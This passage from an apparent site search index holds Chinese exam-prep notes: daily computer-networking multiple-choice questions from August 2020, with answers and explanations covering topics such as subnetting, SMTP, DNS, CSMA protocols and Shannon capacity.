\u89e3\u6790\uff1a\u5728\u5f88\u591a\u5b9e\u9645\u7684\u7f51\u7edc\u5e94\u7528\u4e2d\uff0c\u6709\u53ef\u80fd\u7f51\u6865\u4f1a\u53cd\u590d\u8f6c\u53d1\u540c\u4e00\u4e2a\u5e27\uff0c\u4e3a\u4e86\u907f\u514d\u51fa\u73b0\u73af\u72b6\u7ed3\u6784(\u515c\u5708\u5b50\u95ee\u9898)\uff0c\u900f\u660e\u7f51\u6865\u4f7f\u7528\u4e86\u751f\u6210\u6811\u7b97\u6cd5\u3002\u6839\u636e\u751f\u6210\u6811\u7b97\u6cd5\u5236\u5b9a\u7684\u534f\u8bae\u79f0\u4e3a\u751f\u6210\u6811\u534f\u8bae\u3002\u5b83\u7684\u5de5\u4f5c\u539f\u7406\u5982\u4e0b\uff1a \u6839\u7f51\u6865\u662f\u4ece\u7f51\u7edc\u4e2d\u9009\u62e9\u7684\u4e00\u4e2a\u4f5c\u4e3a\u5c5e\u6027\u62d3\u6251\u7684\u6811\u6839\uff1b\u6700\u77ed\u8def\u5f84\u5f00\u9500\u662f\u4e00\u4e2a\u7f51\u6865\u5230\u6839\u7f51\u6865\u7684\u6700\u77ed\u8def\u5f84\uff1b\u6307\u5b9a\u7f51\u6865\u8d1f\u8d23\u8f6c\u53d1\u5230\u6839\u7f51\u6865\u7684\u6570\u636e\uff1b\u5bf9\u4e8e\u6bcf\u4e2a\u975e\u6839\u7f51\u6865\uff0c\u90fd\u9700\u8981\u4ece\u5b83\u7684\u7aef\u53e3\u4e2d\u9009\u51fa\u4e00\u4e2a\u5230\u8fbe\u6839\u7f51\u6865\u8def\u5f84\u6700\u77ed\u7684\u7aef\u53e3\u4f5c\u4e3a\u6839\u7aef\u53e3\uff0c\u8d1f\u8d23\u5c06\u672c\u7f51\u6bb5\u7684\u6570\u636e\u53d1\u9001\u5230\u6839\u7f51\u6865\uff0c\u8fd9\u4e2a\u7aef\u53e3\u53eb\u505a\u6307\u5b9a\u7aef\u53e3\uff0c\u4e00\u4e2a\u7f51\u6bb5\u4e2d\u53ea\u6709\u4e00\u4e2a\u6307\u5b9a\u7aef\u53e3\uff1b\u751f\u6210\u6811\u534f\u8bae\u4e3a\u6bcf\u4e00\u4e2a\u7f51\u6bb5\u9009\u62e9\u4e00\u4e2a\u6307\u5b9a\u7aef\u53e3\uff0c\u90a3\u4e48\u5176\u4ed6\u7684\u7aef\u53e3\u5747\u5904\u4e8e\u963b\u585e\u72b6\u6001\u3002 \u6784\u9020\u751f\u6210\u6811\u9996\u5148\u8981\u9009\u62e9\u4e00\u4e2a\u7f51\u6865\u4f5c\u4e3a\u751f\u6210\u6811\u7684\u6839\u3002\u5b9e\u73b0\u65b9\u6cd5\u662f\u9009\u62e9ID\u6700\u5c0f\u7684\u7f51\u6865\u4f5c\u4e3a\u6839\u7f51\u6865\u3002\u63a5\u7740\uff0c\u6309\u7167\u6839\u5230\u7f51\u6865\u7684\u6700\u77ed\u8def\u5f84\u6765\u6784\u9020\u751f\u6210\u6811\u3002\u5982\u679c\u67d0\u4e2a\u7f51\u6865\u6216\u5c40\u57df\u7f51\u5931\u8d25\uff0c\u5219\u91cd\u65b0\u8ba1\u7b97\u3002\u8be5\u7b97\u6cd5\u7684\u7ed3\u679c\u662f\u5efa\u7acb\u8d77\u4ece\u6bcf\u4e2a\u5c40\u57df\u7f51\u5230\u6839\u7f51\u6865\u7684\u60df\u4e00\u8def\u5f84\u3002\u8be5\u8fc7\u7a0b\u7531\u751f\u6210\u6811\u7b97\u6cd5\u8f6f\u4ef6\u81ea\u52a8\u4ea7\u751f\uff1b\u62d3\u6251\u7ed3\u6784\u53d8\u5316\u65f6\u5c06\u66f4\u65b0\u8ba1\u7b97\u751f\u6210\u6811\u3002 3.2. Tue # \u4e0b\u5217\u5173\u4e8e\u4ee4\u724c\u73af\u7f51\u7edc\u7684\u63cf\u8ff0\u4e2d\uff0c\u9519\u8bef\u7684\u662f [\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] A.\u4ee4\u724c\u73af\u7f51\u7edc\u5b58\u5728\u51b2\u7a81 B.\u540c\u4e00\u65f6\u523b\uff0c\u73af\u4e0a\u53ea\u6709\u4e00\u4e2a\u6570\u636e\u5728\u4f20\u8f93 C.\u7f51\u4e0a\u6240\u6709\u8282\u70b9\u5171\u4eab\u7f51\u7edc\u5e26\u5bbd D.\u6570\u636e\u4ece\u4e00\u4e2a\u8282\u70b9\u5230\u53e6\u4e00\u4e2a\u8282\u70b9\u7684\u65f6\u95f4\u53ef\u4ee5\u8ba1\u7b97 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u4ee4\u724c\u73af\u7f51\u7684\u62d3\u6251\u7ed3\u6784\u4e3a\u73af\u5f62\uff0c\u5b58\u5728\u4e00\u4e2a\u4ee4\u724c\u4e0d\u505c\u5730\u5728\u73af\u4e2d\u6d41\u52a8\uff0c\u53ea\u6709\u83b7\u5f97\u4e86\u4ee4\u724c\u7684\u4e3b\u673a\u624d\u80fd\u591f\u53d1\u9001\u6570\u636e\uff0c\u56e0\u6b64\u662f\u4e0d\u5b58\u5728\u51b2\u7a81\u7684\u3002 3.3. Wed # \u4e0b\u5217\u5173\u4e8eSMTP\u534f\u8bae\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f [\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] I\uff0e\u53ea\u652f\u6301\u4f20\u8f937\u6bd4\u7279ASCII\u7801\u5185\u5bb9 II\uff0e\u652f\u6301\u5728\u90ae\u4ef6\u670d\u52a1\u5668\u4e4b\u95f4\u53d1\u9001\u90ae\u4ef6 III\uff0e\u652f\u6301\u4ece\u7528\u6237\u4ee3\u7406\u5411\u90ae\u4ef6\u670d\u52a1\u5668\u53d1\u9001\u90ae\u4ef6 IV\uff0e\u652f\u6301\u4ece\u90ae\u4ef6\u670d\u52a1\u5668\u5411\u7528\u6237\u4ee3\u7406\u53d1\u9001\u90ae\u4ef6 A\uff0e\u4ec5I\u3001II\u548cIII B\uff0e\u4ec5I\u3001II\u548cIV C\uff0e\u4ec5I\u3001III\u548cIV D\uff0e\u4ec5II\u3001III\u548cIV \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6839\u636e\u4e0b\u56fe\u53ef\u77e5\uff0cSMTP\u534f\u8bae\u652f\u6301\u5728\u90ae\u4ef6\u670d\u52a1\u5668\u4e4b\u95f4\u53d1\u9001\u90ae\u4ef6\uff0c\u4e5f\u652f\u6301\u4ece\u7528\u6237\u4ee3\u7406\u5411\u90ae\u4ef6\u670d\u52a1\u5668\u53d1\u9001\u4fe1\u606f\u3002\u6b64\u5916\uff0cSMTP\u534f\u8bae\u53ea\u652f\u6301\u4f20\u8f937\u6bd4\u7279\u7684ASCII\u7801\u5185\u5bb9\u3002\u4ece\u90ae\u4ef6\u670d\u52a1\u5668\u5411\u7528\u6237\u4ee3\u7406\u53d1\u9001\u90ae\u4ef6\u4f7f\u7528\u7684\u662fPOP3\u534f\u8bae\u3002 3.4. Thu # \u67d0\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a180.80.77.55\uff0c\u5b50\u7f51\u63a9\u7801\u4e3a255.255.252.0\u3002\u82e5\u8be5\u4e3b\u673a\u5411\u5176\u6240\u5728\u5b50\u7f51\u53d1\u9001\u5e7f\u64ad\u5206\u7ec4\uff0c\u5219\u76ee\u7684\u5730\u5740\u53ef\u4ee5\u662f [\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] A\uff0e180.80.76.0 B\uff0e180.80.76.255 C\uff0e180.80.77.255 D\uff0e180.80.79.255 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1aIPv4\u5730\u5740\u4e2d\u7684\u7279\u6b8a\u5730\u5740\uff0c\u76f4\u63a5\u5e7f\u64ad\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u628a\u4e3b\u673a\u4f4d\u5168\u90e8\u8bbe\u7f6e\u4e3a1\uff0c\u8fd9\u91cc77\u7684\u4e8c\u8fdb\u5236\u662f01001101\uff0c\u5b50\u7f51\u63a9\u7801252\u7684\u4e8c\u8fdb\u5236\u662f11111100\uff0c\u7531\u6b64\u53ef\u4ee5\u770b\u523077\u7684\u524d6\u4f4d\u4f5c\u4e3a\u5b50\u7f51\u4f4d\uff0c\u540e\u56db\u4f4d\u4f5c\u4e3a\u4e3b\u673a\u4f4d\uff0c\u7531\u6b64\u53ef\u4ee5\u77e5\u9053\u5176\u5e7f\u64ad\u5730\u5740\u662f180.80.01001111.255\uff0c\u4e5f\u5c31\u662f180.80.79.255\uff0c\u56e0\u6b64\u7b54\u6848\u662fD\u3002 4. Week 4 # 4.1. Tue # \u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u65e0\u7f13\u5b58\uff0c\u5f53\u91c7\u7528\u9012\u5f52\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u7f51\u7edc\u67d0\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u548c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u9001\u7684\u57df\u540d\u8bf7\u6c42\u6761\u6570\u5206\u522b\u4e3a [\u5c71\u4e1c\u519c\u4e1a\u5927\u5b66903-2017] A\uff0e1\u6761\uff0c1\u6761 B\uff0e1\u6761\uff0c\u591a\u6761 C\uff0e\u591a\u6761\uff0c1\u6761 D\uff0e\u591a\u6761\uff0c\u591a\u6761 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u901a\u5e38\uff0c\u57df\u540d\u89e3\u6790\u6709\u9012\u5f52\u89e3\u6790\u4e0e\u9012\u5f52\u8fed\u4ee3\u7ed3\u5408\u89e3\u6790\u4e24\u79cd\u65b9\u5f0f\u3002\u9012\u5f52\u89e3\u6790\u8981\u6c42\u57df\u540d\u670d\u52a1\u5668\u7cfb\u7edf\u4e00\u6b21\u6027\u5b8c\u6210\u5168\u90e8\u57df\u540d\u5730\u5740\u53d8\u6362\u3002\u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u65e0\u7f13\u5b58\uff0c\u5f53\u91c7\u7528\u9012\u5f52\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u7f51\u7edc\u67d0\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u3001\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u9001\u7684\u57df\u540d\u8bf7\u6c42\u6761\u6570\u5206\u522b\u4e3a1\u6761\u30011\u6761\u3002\u800c\u8fed\u4ee3\u89e3\u6790\u5219\u662f\u6bcf\u6b21\u8bf7\u6c42\u4e00\u4e2a\u670d\u52a1\u5668\uff0c\u4e0d\u884c\u518d\u8bf7\u6c42\u5176\u4ed6\u670d\u52a1\u5668\u3002\u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u65e0\u7f13\u5b58\uff0c\u5f53\u91c7\u7528\u8fed\u4ee3\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u7f51\u7edc\u67d0\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u3001\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u9001\u7684\u57df\u540d\u8bf7\u6c42\u6761\u6570\u5206\u522b\u4e3a1\u6761\u3001\u591a\u6761\u3002","title":"2020 August"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#2020-august","text":"","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 August"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#_1","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 August \u76ee\u5f55 1. Week 1 1.1. Mon 1.2. Tue 1.3. Wed 1.4. Thu 1.5. Fri 2. Week 2 2.1. Sat 2.2. Sun 3. Week 3 3.1. Mon 3.2. Tue 3.3. Wed 3.4. Thu 4. Week 4 4.1. Tue","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#1-week-1","text":"","title":"1. Week 1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#11-mon","text":"\u8bbeTCP\u4f7f\u7528\u7684\u6700\u5927\u7a97\u53e3\u4e3a64KB\uff0c\u800c\u4f20\u8f93\u4fe1\u9053\u7684\u5e26\u5bbd\u53ef\u8ba4\u4e3a\u662f\u4e0d\u53d7\u9650\u5236\u7684\u3002\u82e5\u62a5\u6587\u6bb5\u7684\u5e73\u5747\u5f80\u8fd4\u65f6\u5ef6\u4e3a20ms\uff0c\u95ee\u6240\u80fd\u5f97\u5230\u7684\u6700\u5927\u541e\u5410\u91cf\u662f \u3002[\u4e2d\u5c71\u5927\u5b66] A. 24.6 B. 26.2 C. 25.8 D. 26.8 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4f20\u8f93\u4fe1\u9053\u7684\u5e26\u5bbd\u53ef\u8ba4\u4e3a\u662f\u4e0d\u53d7\u9650\u5236\u7684\uff0c\u5219\u53d1\u9001\u65f6\u5ef6\u53ef\u5ffd\u7565\u3002\u5e73\u5747\u5f80\u8fd4\u65f6\u5ef6\u4e3a20ms\uff0c\u5219\u53d1\u9001\u65b9\u6bcf\u79d2\u53ef\u53d1\u9001\u6570\u636e=1/(20*10-3)=50\u6b21\u53ea\u6709\u6bcf\u6b21\u90fd\u6309\u6700\u5927\u7a97\u53e3\u6570\u53d1\u9001\u6570\u636e\u624d\u80fd\u5f97\u5230\u6700\u5927\u7684\u541e\u5410\u91cf\u3002\u6240\u4ee5\uff1a\u6700\u5927\u541e\u5410\u91cf=\u6bcf\u79d2\u53d1\u9001\u6570\u636e\u6b21\u6570*\u6700\u5927\u7a97\u53e3=50*64KB=50*64*1024*8=26.2Mbps\u3002","title":"1.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#12-tue","text":"\u4e0b\u5217\u9009\u9879\u4e2d\uff0c\u5bf9\u6b63\u786e\u63a5\u6536\u5230\u7684\u6570\u636e\u5e27\u8fdb\u884c\u786e\u8ba4\u7684MAC \u534f\u8bae\u662f \u3002[\u4e2d\u5c71\u5927\u5b66] A. CSMA B. CDMA C. CSMA / CD D. CSMA / CA \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u53ef\u4ee5\u7528\u6392\u9664\u6cd5\u3002\u9996\u5148CDMA\u5373\u7801\u5206\u591a\u5740\uff0c\u662f\u7269\u7406\u5c42\u7684\u4e1c\u897f\uff1bCSMA/CD\u5373\u5e26\u51b2\u7a81\u68c0\u6d4b\u7684\u8f7d\u6ce2\u76d1\u542c\u591a\u8def\u8bbf\u95ee\uff0c\u8fd9\u4e2a\u5e94\u8be5\u6bd4\u8f83\u719f\u6089\uff0c\u63a5\u6536\u65b9\u5e76\u4e0d\u9700\u8981\u786e\u8ba4\uff1bCSMA\uff0c\u65e2\u7136CSMA/CD\u662f\u5176\u8d85\u96c6\uff0cCSMA/CD\u6ca1\u6709\u7684\u4e1c\u897f\uff0cCSMA\u81ea\u7136\u4e5f\u6ca1\u6709\u3002\u4e8e\u662f\u6392\u9664\u6cd5\u9009D\u3002CSMA/CA\u662f\u65e0\u7ebf\u5c40\u57df\u7f51\u6807\u51c6802.11\u4e2d\u7684\u534f\u8bae\u3002CSMA/CA\u5229\u7528ACK\u4fe1\u53f7\u6765\u907f\u514d\u51b2\u7a81\u7684\u53d1\u751f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u6709\u5f53\u5ba2\u6237\u7aef\u6536\u5230\u7f51\u7edc\u4e0a\u8fd4\u56de\u7684ACK\u4fe1\u53f7\u540e\u624d\u786e\u8ba4\u9001\u51fa\u7684\u6570\u636e\u5df2\u7ecf\u6b63\u786e\u5230\u8fbe\u76ee\u7684\u5730\u5740\u3002","title":"1.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#13-wed","text":"\u5728OSI\u53c2\u8003\u6a21\u578b\u4e2d\uff0c\u7b2cN\u5c42\u548c\u5176\u4e0a\u7684\u7b2cN+1\u5c42\u7684\u5173\u7cfb\u662f \u3002[\u56db\u5ddd\u5927\u5b66873-2018] A\uff0e\u7b2cN\u5c42\u4e3a\u7b2cN+1\u5c42\u63d0\u4f9b\u670d\u52a1 B\uff0e\u7b2cN+1\u5c42\u5c06\u4ece\u7b2cN\u5c42\u63a5\u6536\u7684\u4fe1\u606f\u589e\u52a0\u4e86\u4e00\u4e2a\u5934 C\uff0e\u7b2cN\u5c42\u5229\u7528\u7b2cN+1\u5c42\u63d0\u4f9b\u7684\u670d\u52a1 D\uff0e\u7b2cN\u5c42\u5bf9N+1\u5c42\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u672c\u9898\u8003\u67e5OSI\u6a21\u578b\u7684\u5c42\u6b21\u5173\u7cfb\uff0c\u5728\u534f\u8bae\u7684\u63a7\u5236\u4e0b\uff0c\u4e24\u4e2a\u5bf9\u7b49\u5b9e\u4f53\u95f4\u7684\u901a\u4fe1\u4f7f\u5f97\u672c\u5c42\u80fd\u591f\u5411\u4e0a\u4e00\u5c42\u63d0\u4f9b\u670d\u52a1\uff0c\u540c\u65f6\u8981\u5b9e\u73b0\u672c\u5c42\u534f\u8bae\uff0c\u8fd8\u9700\u8981\u4f7f\u7528\u4e0b\u5c42\u6240\u63d0\u4f9b\u7684\u670d\u52a1\u3002\u672c\u5c42\u7684\u670d\u52a1\u7528\u6237\u53ea\u80fd\u770b\u89c1\u670d\u52a1\u800c\u65e0\u6cd5\u770b\u89c1\u4e0b\u9762\u7684\u534f\u8bae\u3002\u4e0b\u5c42\u7684\u534f\u8bae\u5bf9\u4e0a\u5c42\u7684\u670d\u52a1\u7528\u6237\u662f\u900f\u660e\u7684\u3002\u4e5f\u5c31\u662f\u4e0b\u4e00\u5c42\u8981\u4e3a\u4e0a\u4e00\u5c42\u63d0\u4f9b\u670d\u52a1\uff0c\u5e76\u4e3a\u4e0a\u4e00\u5c42\u6570\u636e\u8fdb\u884c\u5c01\u88c5\uff0c\u56e0\u6b64\u7b54\u6848\u4e3aA\uff0c\u8fd9\u91cc\u9009\u9879B\u548cC\u7684\u8bf4\u6cd5\u6b63\u597d\u76f8\u53cd\uff0c\u5e94\u8be5\u662f\u7b2cN\u5c42\u5c06\u4ece\u7b2cN+1\u5c42\u63a5\u6536\u7684\u4fe1\u606f\u589e\u52a0\u4e86\u4e00\u4e2a\u5934\uff0c\u7b2cN+1\u5c42\u5229\u7528\u7b2cN\u5c42\u63d0\u4f9b\u7684\u670d\u52a1\u3002","title":"1.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#14-thu","text":"\u4ee5\u4e0b\u5404\u9879\u4e2d\uff0c\u4e0d\u662f\u6570\u636e\u62a5\u64cd\u4f5c\u7279\u70b9\u7684\u662f [\u56db\u5ddd\u5927\u5b66873-2018] A. \u6bcf\u4e2a\u5206\u7ec4\u81ea\u8eab\u643a\u5e26\u6709\u8db3\u591f\u7684\u4fe1\u606f\uff0c\u5b83\u7684\u4f20\u9001\u662f\u88ab\u5355\u72ec\u5904\u7406\u7684 B. \u5728\u6574\u4e2a\u4f20\u9001\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u9700\u5efa\u7acb\u865a\u7535\u8def C. \u4f7f\u6240\u6709\u5206\u7ec4\u6309\u987a\u5e8f\u5230\u8fbe\u76ee\u7684\u7aef\u7cfb\u7edf D. \u7f51\u7edc\u8282\u70b9\u8981\u4e3a\u6bcf\u4e2a\u5206\u7ec4\u505a\u51fa\u8def\u7531\u9009\u62e9 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u6570\u636e\u62a5\u9ed8\u8ba4\u662f\u6307UDP\u6570\u636e\u62a5\uff0c\u800c\u62a5\u6587\u6bb5\u5f80\u5f80\u548cTCP\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u79f0\u4f5cTCP\u62a5\u6587\u6bb5\u3002 UDP\u662f\u4e00\u79cd\u65e0\u8fde\u63a5\u3001\u65e0\u72b6\u6001\u7684\u4f20\u8f93\u5c42\u534f\u8bae\u3002","title":"1.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#15-fri","text":"\u5728CSMA/CD\u534f\u8bae\u4e2d\uff0c\u4e0b\u5217\u6307\u6807\u4e0e\u51b2\u7a81\u65f6\u95f4\u6ca1\u6709\u5173\u7cfb\u7684\u662f______\u3002[\u5409\u6797\u5927\u5b66979] A\uff0e\u68c0\u6d4b\u4e00\u6b21\u51b2\u7a81\u6240\u9700\u7684\u6700\u957f\u65f6\u95f4 B\uff0e\u6700\u5c0f\u5e27\u957f\u5ea6 C\uff0e\u6700\u5927\u5e27\u957f\u5ea6 D\uff0e\u6700\u5927\u5e27\u788e\u7247\u957f\u5ea6 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u672c\u9898\u8003\u67e5CSMA/CD\u534f\u8bae\u4e2d\u51b2\u7a81\u65f6\u95f4\u3002\u51b2\u7a81\u65f6\u95f4\u5c31\u662f\u80fd\u591f\u8fdb\u884c\u51b2\u7a81\u68c0\u6d4b\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5176\u51b3\u5b9a\u4e86\u6700\u5c0f\u5e27\u7684\u957f\u5ea6\u548c\u6700\u5927\u5e27\u788e\u7247\u7684\u957f\u5ea6\uff0c\u5bf9\u6700\u5927\u5e27\u7684\u957f\u5ea6\u6ca1\u6709\u5f71\u54cd\uff0c\u56e0\u6b64\u7b54\u6848\u662fC\u3002","title":"1.5. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#2-week-2","text":"","title":"2. Week 2"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#21-sat","text":"\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5171 3072\u5b57\u8282\u957f\u3002\u82e5\u4f7f\u7528base64\u7f16\u7801\uff0c\u5e76\u4e14\u6bcf\u53d1\u9001\u5b8c80\u5b57\u8282\u5c31\u63d2\u5165\u4e00\u4e2a\u56de\u8f66\u7b26CR\u548c\u4e00\u4e2a\u6362\u884c\u7b26LF,\u95ee\u4e00\u5171\u53d1\u9001\u4e86\u591a\u5c11\u4e2a\u5b57\u8282? [\u91cd\u5e86\u90ae\u7535\u5927\u5b66803-2017] A\uff0e4200 B\uff0e4198 C\uff0e4196 D\uff0e3150 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1abase64\u7684\u7f16\u7801\u539f\u5219\u65b9\u6cd5\u662f\u5148\u5c06\u4e8c\u8fdb\u5236\u4ee3\u7801\u5212\u5206\u4e3a\u4e00\u4e2a24bit\u957f\u7684\u5355\u5143\uff0c\u7136\u540e\u5c06\u6bcf\u4e00\u4e2a24bit\u5355\u5143\u5212\u5206\u4e3a4\u4e2a6bit\u7ec4\uff0c\u6bcf\u4e00\u4e2a6bit\u7ec4\u6309\u7167\u4e00\u4e0b\u65b9\u6cd5\u8f6c\u6362\u6210ASCII\u7801\u30026bit\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\u5171\u670964\u4e2d\u4e0d\u540c\u7684\u503c\uff0c\u4ece0\u523063\uff0c\u5206\u522b\u7528\u5927\u5199\u5b57\u7801\uff0c\u5c0f\u5199\u5b57\u7801\uff0c10\u4e2a\u963f\u62c9\u4f2f\u6570\u5b57\uff0c+\uff0c/\u8868\u793a\uff0c\u518d\u7528\u4e24\u4e2a\u8fde\u5728\u4e00\u8d77\u7684\u7b49\u53f7\u548c\u4e00\u4e2a\u7b49\u53f7\u5206\u522b\u8868\u793a\u6700\u540e\u4e00\u7ec4\u7684\u4ee3\u7801\u53ea\u67098\u621616bit\u3002\u56de\u8f66\u548c\u6362\u884c\u53ef\u4ee5\u5728\u4efb\u4f55\u5730\u65b9\u63d2\u5165\u3002\u7136\u540e\u5c06ASCII\u7801\u8fdb\u884c\u4f20\u8f93\u3002\u7b80\u5355\u8bf4\uff0c\u662f\u5c06\u6bcf6bit\u7684\u6570\u636e\u8f6c\u6362\u4e3a8bit\u4e4b\u540e\u518d\u8fdb\u884c\u4f20\u8f93\u3002 \u8f6c\u6362\u540e\u5171\u9700\u8981\u4f20\u9001\u7684\u5b57\u8282\u6570=3072 / 6*8=4096,\u7531\u9898\u77e5\u6bcf80\u4e2a\u5b57\u8282\u5c31\u63d2\u5165\u4e24\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u4e00\u5171\u8fd8\u9700\u8981\u63d2\u5165\u7684\u5b57\u8282\u6570\u4e3a4096/80*2=102\u518d\u52a0\u4e0a\u6700\u540e\u4e00\u7ec4\u53d1\u9001\u5b8c\u5e94\u7b54\u5982\u7684CR\u548cLF\uff0c\u6700\u540e\u4e00\u5171\u9700\u8981\u4f20\u8f93\u7684\u5b57\u8282\u6570\u4e3a4096+102+2=4200\u3002","title":"2.1. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#22-sun","text":"\u7535\u8bdd\u7cfb\u7edf\u7684\u5178\u578b\u53c2\u6570\u662f\u4fe1\u9053\u5e26\u5bbd\u4e3a3000Hz\uff0c\u4fe1\u566a\u6bd4\u4e3a30dB\uff0c\u5219\u8be5\u7cfb\u7edf\u7684\u6700\u5927\u6570\u636e\u4f20\u8f93\u901f\u7387\u4e3a\u591a\u5c11\uff1f[\u91cd\u5e86\u90ae\u7535\u5927\u5b66803-2017] A\uff0e3kbps B\uff0e6kbps C\uff0e30kbps D\uff0e64kbps \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u7535\u8bdd\u7cfb\u7edf\u7684\u4fe1\u9053\u662f\u6709\u566a\u58f0\u7684\u4fe1\u9053\uff0c\u6240\u4ee5\u8be5\u9898\u5e94\u8be5\u7528\u9999\u519c\u516c\u5f0f\u6765\u6c42\u89e3. \u4fe1\u566a\u6bd4\uff08dB)=10log10(S/N) (dB) 30dB=10log10(S/N) dB \u89e3\u5f97\uff1aS/N=1000 \u6839\u636e\u9999\u519c\u516c\u5f0f\uff1a\u4f20\u8f93\u901f\u7387C=Wlog2(1+S/N) (bit/s) W\u4e3a\u4fe1\u9053\u5e26\u5bbd C=3000*log2\uff081+S/N\uff09bit/s =3000*10 bit/s =30*1000 bit/s =30 kbit/s","title":"2.2. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#3-week-3","text":"","title":"3. Week 